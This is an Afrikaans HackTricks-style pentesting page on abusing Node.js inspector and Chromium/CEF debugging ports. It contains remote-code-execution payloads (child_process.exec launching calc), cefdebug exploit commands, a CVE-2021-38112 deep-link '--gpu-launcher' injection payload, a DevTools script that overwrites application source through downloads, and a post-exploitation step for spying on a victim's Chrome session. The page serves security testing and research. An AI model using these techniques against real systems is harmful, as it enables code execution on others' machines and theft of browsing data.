# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Basiese inligting

[Volgens die dokumentasie](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Wanneer dit met die `--inspect`-skakelaar begin word, luister ’n Node.js-proses vir ’n debugging-kliënt. By **verstek** sal dit op gasheer en poort **`127.0.0.1:9229`** luister. Elke proses kry ook ’n **unieke** **UUID** toegeken.<sup>[[4]](#references)</sup>

Inspector-kliënte moet die gasheeradres, poort en UUID ken en spesifiseer om te koppel. ’n Volledige URL sal ongeveer soos `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` lyk.<sup>[[4]](#references)</sup>

> [!WARNING]
> Aangesien die **debugger volle toegang tot die Node.js-uitvoeringsomgewing het**, kan ’n kwaadwillige akteur wat aan hierdie poort kan koppel moontlik arbitrêre code namens die Node.js-proses uitvoer (**potensiële privilege escalation**).

Daar is verskeie maniere om ’n inspector te begin:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Wanneer jy ’n geïnspekteerde proses begin, sal iets soos die volgende verskyn:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Prosesse gebaseer op **CEF** (**Chromium Embedded Framework**) moet die parameter `--remote-debugging-port=9222` gebruik om die **debugger** oop te maak (die SSRF-beskermings bly baie soortgelyk). Hulle sal egter, **in plaas daarvan** om ’n **NodeJS** **debug**-sessie toe te staan, met die blaaier kommunikeer deur die [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/); dit is ’n koppelvlak om die blaaier te beheer, maar daar is nie ’n direkte RCE nie.<sup>[[5]](#references)</sup>

Wanneer jy ’n browser met debugging begin, sal iets soos die volgende verskyn:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Blaaiers, WebSockets en same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Webwerwe wat in ’n webblaaier oopgemaak word, kan WebSocket- en HTTP-versoeke binne die blaaier se sekuriteitsmodel maak. ’n **Aanvanklike HTTP-verbinding** is nodig om ’n **unieke debugger-sessie-ID te verkry**. Die **same-origin-policy** **verhoed** dat webwerwe **hierdie HTTP-verbinding** kan maak. Vir bykomende sekuriteit teen [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** verifieer Node.js dat die **'Host'-headers** vir die verbinding óf ’n **IP-adres** óf presies **`localhost`** óf **`localhost6`** spesifiseer.<sup>[[12]](#references)</sup>

> [!TIP]
> Hierdie **sekuriteitsmaatreël verhoed dat die inspector uitgebuit word** om kode uit te voer deur **net ’n HTTP-versoek te stuur** (wat gedoen kon word deur ’n SSRF-vuln. uit te buit).

### Begin inspector in lopende prosesse

Jy kan die **sein SIGUSR1** na ’n lopende nodejs-proses stuur om dit die **inspector** op die verstekpoort te laat **begin**. Let egter daarop dat jy voldoende voorregte moet hê; dit kan jou dus **bevoorregte toegang tot inligting binne die proses** gee, maar nie ’n direkte voorregeskalering nie.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Dit is nuttig in containers omdat **die proses afskakel en 'n nuwe een begin** met `--inspect` **nie 'n opsie is nie**, omdat die **container** saam met die proses **beëindig** sal word.

### Koppel aan inspector/debugger

Om aan 'n **Chromium-gebaseerde blaaier** te koppel, kan die `chrome://inspect`- of `edge://inspect`-URL's onderskeidelik vir Chrome of Edge verkry word. Deur op die Configure-knoppie te klik, moet daar verseker word dat die **teiken-gasheer en -poort** korrek gelys is. Die afbeelding toon 'n Remote Code Execution (RCE)-voorbeeld:

![Nadat 'n URL om toegang tot die debugger te verkry sal verskyn. bv. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Koppel aan inspector/debugger: Om aan 'n Chromium-gebaseerde blaaier te koppel,...](<../../images/image (674).png>)

Deur die **command line** te gebruik, kan jy aan 'n debugger/inspector koppel met:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Die **[https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)** tool laat jou toe om **inspectors** wat plaaslik loop te vind en **code** daarin te **inject**.<sup>[[1]](#references)[[2]](#references)[[11]](#references)[[13]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Let daarop dat **NodeJS RCE exploits nie sal werk nie** as dit via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) aan 'n browser gekoppel is (jy moet die API nagaan om interessante dinge te vind om daarmee te doen).

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> As jy hier gekom het om uit te vind hoe om [**RCE vanaf 'n XSS in Electron te verkry, kyk asseblief na hierdie bladsy.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Sommige algemene maniere om **RCE** te verkry wanneer jy aan 'n Node **inspector** kan **koppel**, is om iets soos die volgende te gebruik (dit lyk asof dit **nie sal werk met 'n verbinding met Chrome DevTools protocol nie**):<sup>[[3]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Jy kan die API hier nagaan: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)<sup>[[5]](#references)</sup>\
In hierdie afdeling sal ek slegs interessante dinge lys wat ek gevind het wat mense gebruik het om hierdie protocol te exploit.

### Parameter Injection via Deep Links

In die [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) het Rhino security ontdek dat ’n toepassing gebaseer op CEF ’n pasgemaakte UR**I** in die stelsel geregistreer het (workspaces://index.html) wat die volledige URI ontvang het en daarna die CEF-gebaseerde toepassin**g** geloods het met ’n konfigurasie wat gedeeltelik uit daardie URI saamgestel is.<sup>[[8]](#references)</sup>

Daar is ontdek dat die URI-parameters URL decoded is en gebruik is om die CEF-basiese toepassing te loods, wat ’n gebruiker toegelaat het om die flag **`--gpu-launcher`** in die **command line** te **inject** en arbitrêre dinge uit te voer.

Dus, ’n payload soos:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Sal ’n calc.exe uitvoer.

### Lêers oorskryf

Verander die vouer waar **afgelaaide lêers gestoor gaan word** en laai ’n lêer af om die gereeld gebruikte **broncode** van die toepassing met jou **kwaadwillige code** te **oorskryf**.<sup>[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE and exfiltration

Volgens hierdie plasing: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) is dit moontlik om RCE te verkry en interne bladsye van theriver te exfiltrate.<sup>[[9]](#references)[[10]](#references)</sup>

### Post-Exploitation

In 'n werklike omgewing en **nadat jy 'n** gebruiker se rekenaar wat 'n Chrome/Chromium-gebaseerde browser gebruik **gekompromitteer het**, kan jy 'n Chrome-proses launch met die **debugging geaktiveer en die debugging-poort port-forward** sodat jy toegang daartoe kan verkry. Op hierdie manier sal jy **alles wat die slagoffer met Chrome doen, kan inspekteer en sensitiewe inligting kan steel**.<sup>[[7]](#references)</sup>

Die stealth-manier is om **elke Chrome-proses te terminate** en dan iets soos... te call
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Verwysings

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger-inspeksie- en exploitation-tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Visual Studio Code Remote Code Execution via Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Aan die gang](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusing Chrome's Debugging Feature to Observe and Control Browsing Sessions Remotely](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE via DNS Rebinding and CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - From Bot to RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)

{{#include ../../banners/hacktricks-training.md}}
